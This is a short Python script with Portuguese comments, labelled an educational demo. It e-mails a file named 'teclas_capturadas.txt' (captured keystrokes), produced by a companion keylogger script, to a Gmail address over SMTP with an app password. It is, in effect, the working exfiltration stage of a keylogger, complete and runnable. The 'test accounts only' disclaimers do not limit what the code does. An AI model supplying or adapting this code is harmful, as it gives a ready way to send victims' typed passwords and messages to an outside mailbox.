"""
Demonstração educacional de envio de arquivo por e-mail usando smtplib.

Use apenas uma conta de e-mail de teste e envie somente arquivos criados
por você. Nunca envie dados capturados de terceiros.

Para Gmail, é necessário usar uma 'senha de aplicativo'.
"""
import os
import smtplib
from email.message import EmailMessage

# Substitua apenas pelos seus dados de teste.
# Em um projeto real, use variáveis de ambiente em vez de credenciais no código.
EMAIL_REMETENTE = "seu_email_de_teste@gmail.com"
EMAIL_DESTINATARIO = "seu_email_de_teste@gmail.com"
SENHA_DE_APP = "SUA_SENHA_DE_APLICATIVO"

ARQUIVO_PARA_ENVIAR = "teclas_capturadas.txt"

def enviar_email():
    if not os.path.exists(ARQUIVO_PARA_ENVIAR):
        print("[!] Execute primeiro o keylogger_local.py para criar o arquivo de teste.")
        return

    mensagem = EmailMessage()
    mensagem["Subject"] = "Teste educacional - arquivo simulado"
    mensagem["From"] = EMAIL_REMETENTE
    mensagem["To"] = EMAIL_DESTINATARIO
    mensagem.set_content("Este é um teste educacional de envio de arquivo usando Python e smtplib.")

    with open(ARQUIVO_PARA_ENVIAR, "rb") as arquivo:
        conteudo = arquivo.read()

    mensagem.add_attachment(
        conteudo,
        maintype="text",
        subtype="plain",
        filename=ARQUIVO_PARA_ENVIAR
    )

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as servidor:
            servidor.login(EMAIL_REMETENTE, SENHA_DE_APP)
            servidor.send_message(mensagem)

        print("[+] E-mail de teste enviado com sucesso.")
        print("[+] Use apenas contas e arquivos criados por você.")

    except Exception as erro:
        print(f"[!] Falha no envio: {erro}")

if __name__ == "__main__":
    enviar_email()
